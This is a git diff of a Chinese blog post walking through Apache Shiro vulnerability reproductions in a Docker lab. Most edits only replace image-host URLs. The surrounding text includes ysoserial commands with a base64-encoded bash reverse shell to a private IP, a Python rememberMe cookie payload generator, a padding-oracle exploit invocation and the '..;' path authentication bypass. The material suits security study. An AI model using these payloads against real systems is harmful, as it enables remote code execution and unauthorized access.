@@ -76,13 +76,13 @@ password:
      mvn package -D skipTests
      ```
 
-     ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161439078.png)
+     ![](http://pic.charo.xyz/blog/202110161439078.png)
 
      ​	生成的工具在ysoserial/target文件中。
 
    - **漏洞利用**
 
-     ​	 我们先用浏览器访问`http://172.17.0.1:8080`，通过*burpsuite*的重放功能进行查看特征字段![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161446443.png)
+     ​	 我们先用浏览器访问`http://172.17.0.1:8080`，通过*burpsuite*的重放功能进行查看特征字段![](http://pic.charo.xyz/blog/202110161446443.png)
 
      ​	 检查是否存在默认的key。使用Shiro_exploit，获取key
 
@@ -90,7 +90,7 @@ password:
 
      ​	`python shiro_exploit.py -u http://172.17.0.1:8080`
 
-     ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161453262.png)
+     ![](http://pic.charo.xyz/blog/202110161453262.png)
 
      ​	nc反弹shell
 
@@ -112,7 +112,7 @@ password:
         java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'
         ```
 
-        ​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161524359.png)
+        ​	![](http://pic.charo.xyz/blog/202110161524359.png)
 
      4. 编写shiro.py如下
 
@@ -138,7 +138,7 @@ password:
         print "rememberMe={0}".format(payload.decode())
         ```
 
-     5. 使用shiro.py 生成Payload`python shiro.py 10.0.2.15:5555`![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161629323.png)
+     5. 使用shiro.py 生成Payload`python shiro.py 10.0.2.15:5555`![](http://pic.charo.xyz/blog/202110161629323.png)
 
      6. 可能存在的问题
 
@@ -148,9 +148,9 @@ password:
 
      7. 构造数据包，伪造cookie，发送Payload.
 
-        ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161712951.png)
+        ![](http://pic.charo.xyz/blog/202110161712951.png)
 
-     8. nc接听端口成功![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161846151.png)
+     8. nc接听端口成功![](http://pic.charo.xyz/blog/202110161846151.png)
      
      9. 如果只是想简单的获得反弹shell可以执行以下命令即可获得
      
@@ -236,21 +236,21 @@ password:
 
     将war包拷贝到docker tomcat容器中的webasps目录下之后打开http://192.168.1.9:8080/samples-web-1.4.1/
 
-    ​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161941729.png)
+    ​	![](http://pic.charo.xyz/blog/202110161941729.png)
 
   - ##### 漏洞利用
 
     ​	登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944437.png)
+    ![](http://pic.charo.xyz/blog/202110161944437.png)
 
     认证失败时（输入错误的用户名和密码），http响应页面中会显示出deleteMe的cookie:
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944163.png)
+    ![](http://pic.charo.xyz/blog/202110161944163.png)
 
     认证成功（输入正确的用户名和密码登录），http响应页面中不会显示deleteMe的cookie:
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944095.png)
+    ![](http://pic.charo.xyz/blog/202110161944095.png)
 
     根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况:
 
@@ -259,11 +259,11 @@ password:
 
     这里输入正确的用户名和密码，并勾选Remeber ME。
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161944320.png)
+    ![](http://pic.charo.xyz/blog/202110161944320.png)
 
     登录成功后，访问http://192.168.1.14:8080/account/，并通过burp对其进行抓包，得到Cookie中的rememberMe值
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161945111.png)
+    ![](http://pic.charo.xyz/blog/202110161945111.png)
 
     使用Java反序列化工具 ysoserial 生成 Payload:
 
@@ -293,7 +293,7 @@ password:
      python shiro_exp.py http://192.168.1.14:8080/account/ HZ717RwZHZHuR/x9yMmjJUUGWXLAOiZx01rXghAir47/Xbu++kfYFiJA7gQcSn6oaBqcRXfkihooScqykI8FEWlqmN6agAJr3bh5QH+WshypvevVnsEvUDDaSTCEX8tr3seRX8TAJfuNyvK/DD1HHYdgEKZZ9XbbimYH8S7+Xsv0uzx8PH0OuIiFX3HAofmx5y4cvRpYove0NU+/QaRwZV2LoWtAi0adC/vCHb1H2ochg5LBel6jEQakIP3AmYkEOqfRTRl/sm1olkPM+sFk6+lGw9UtDvWqCCqK5fopXV+0n4qCJlyoNyWdVEmm+mZbxekimV3QDdlC75kuyv9Utw9VtOGMdeyBttl8YrXJCJEFEdIN22LxA//iqnyGjltUEljFrZhTXXhml/V8oPVnXFOAmygIaFD6uv9rWnTtPBlLOblusyElga20ngvoMOVKTu3uYHV0Hmiw/gcnT1yT0ZosI2/fe+dzmbVNyGrwKktYjEobCZIIz/U4intWvQ77  payload.class
     ```
 
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161948586.png)
+    ![](http://pic.charo.xyz/blog/202110161948586.png)
 
     ```shell
     #rememberMe cookies:
@@ -307,14 +307,15 @@ password:
 
     检查一下执行结果，可以看到成功创建了一个test文件
 
-    
+
+​    
 
     ```
     docker exec -it  3f2fb81c0d93 /bin/bash
     
      ls
     ```
-
+    
     ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161949493.png)
 
 ### *Apache Shiro* 认证绕过漏洞 *CVE-2020-1957*
@@ -346,9 +347,9 @@ password:
 
     
 
-  - ##### **浏览器访问admin目录，使用burpsuite抓包**![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110162018085.png)
+  - ##### **浏览器访问admin目录，使用burpsuite抓包**![](http://pic.charo.xyz/blog/202110162018085.png)
 
-  - 换成/xxx/..;/admin/![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110162023359.png)
+  - 换成/xxx/..;/admin/![](http://pic.charo.xyz/blog/202110162023359.png)
 
     成功
 
